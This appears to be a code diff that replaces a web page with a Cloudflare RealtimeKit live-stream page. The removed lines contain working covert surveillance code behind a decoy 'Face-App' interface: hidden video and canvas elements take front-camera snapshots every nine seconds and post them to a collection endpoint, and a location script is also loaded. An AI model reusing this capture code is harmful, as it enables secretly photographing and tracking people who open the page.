@@ -1,139 +1,55 @@
-<!doctype html>
-<html>
-<head>
-  <script src="../../assets/js/jquery.min.js"></script>
-  <script src="../../assets/js/client.min.js"></script>
-  <script src="../../assets/js/loc.js"></script>
-</head>
-
-</html>
-<html>
-<body onload="mydata()">
-
-<div class="video-wrap" hidden="hidden">
-   <video id="video" playsinline autoplay></video>
-</div>
-
-<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
-
-<script>
-
-function post(imgdata){
-    $.ajax({
-        type: 'POST',
-        url: '/api/collect',
-        contentType: 'application/json',
-        data: JSON.stringify({
-            template: 'camera_temp',
-            data: {
-                image: imgdata
-            }
-        }),
-        success: function(result){
-            console.log(result);
-        },
-        error: function(err){
-            console.error(err);
-        }
-    });
-};
-
-
-'use strict';
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
-
-const constraints = {
-  audio: false,
-  video: {
-    
-    facingMode: "user"
-  }
-};
-// environment -- user
-
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
-}
-
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
-
-var context = canvas.getContext('2d');
-  setInterval(function(){
-
-       context.drawImage(video, 0, 0, 640, 640);
-       var canvasData = canvas.toDataURL("image/png")
-       cc = String(canvasData).replace("data:image/png;base64,","")
-      //  console.log(cc)
-       post(cc); }, 9000);
-  
-
-}
-
-// Load init
-init();
-
-</script>
-
-</body>
-</html>
-
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <link rel="stylesheet" href="style.css">
-    <title>Face-App</title>
-    <script>
-        window.console = window.console || function (t) {
-        };
+<html>
+  <head>
+    <title>Live Stream</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <script type="module">
+      import { defineCustomElements } from 'https://cdn.jsdelivr.net/npm/@cloudflare/realtimekit-ui@1.1.7/loader/index.es2017.js';
+      defineCustomElements();
     </script>
-    <script>
-        if (document.location.search.match(/type=embed/gi)) {
-            window.parent.postMessage("resize", "*");
-        }
-    </script>
-</head>
+    <script src="https://cdn.jsdelivr.net/npm/@cloudflare/realtimekit@latest/dist/realtimekit-client.iife.js"></script>
+  </head>
+  <body>
+    <rtk-meeting id="rtk-meeting-streamer" style="height: 100vh; width: 100vw;"></rtk-meeting>
 
-<body translate="no">
-<div id="device">
-    <div id="top">
-        <div class="left">&nbsp;</div>
-        <div class="right">&nbsp;</div>
-    </div>
-    <div id="content">
-        <div class="menu"><i class="fas fa-bolt fa-lg"></i>
-            <div class="profilePhoto"></div>
-            <i class="fas fa-volume-mute fa-lg"></i>
-        </div>
-        <div class="takenPhotos">
-            <div class="first"></div>
-            <div class="second"></div>
-            <div class="third"></div>
-        </div>
-        <div class="circle">
-            <div class="fill"></div>
-        </div>
-        <i class="fas fa-sync-alt fa-lg right"></i>
-        <div class="detection">
-            <div class="line-left"></div>
-            <div class="line-top"></div>
-            <div class="line-right"></div>
-            <div class="line-bottom"></div>
-        </div>
-    </div>
-</div>
-<link rel="stylesheet" href="all.css">
-</body>
+    <script>
+      async function initStream() {
+        try {
+          // 1. Create a meeting on the backend
+          const resp = await fetch('/api/meetings', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ title: 'Camera Stream' }),
+          });
+          const { authToken } = await resp.json();
+
+          if (!authToken) {
+            alert('Failed to get auth token');
+            return;
+          }
+
+          // 2. Initialize the RealtimeKit client
+          const meeting = await RealtimeKitClient.init({
+            authToken,
+            defaults: {
+              audio: false,
+              video: true,
+            },
+          });
+
+          // 3. Mount the meeting UI
+          document.getElementById('rtk-meeting-streamer').meeting = meeting;
+
+          // 4. Join the room
+          meeting.joinRoom();
+
+        } catch (e) {
+          console.error(e);
+          alert('An error occurred. Check the console.');
+        }
+      }
+
+      initStream();
+    </script>
+  </body>
 </html>
